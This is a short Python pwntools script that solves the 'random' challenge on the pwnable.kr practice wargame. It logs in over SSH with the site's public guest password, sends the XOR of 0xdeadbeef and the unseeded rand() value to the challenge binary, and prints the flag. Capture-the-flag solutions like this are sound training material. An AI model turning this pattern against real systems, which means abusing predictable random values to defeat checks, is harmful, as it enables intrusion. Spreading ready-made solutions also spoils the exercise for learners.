#!/usr/bin/env python

from pwn import *

server = ["pwnable.kr", 2222, "random", "guest"]

def connection():
    connectionHandle = ssh(host=server[0], port=server[1], user=server[2], password=server[3])
    return connectionHandle

def createPayload():
    # 0xdeadbeef ^ 0x6b8b4567 = 0xb526fb88
    payload = str(int(0xb526fb88))
    return payload
    
def exploitation(connectionHandle, payload):
    processHandle = connectionHandle.process(executable="/home/random/random")
    processHandle.sendline(payload)

    print(processHandle.recvall(timeout=0.5))
if __name__ == "__main__":
    connectionHandle = connection()
    payload = createPayload()
    exploitation(connectionHandle, payload)
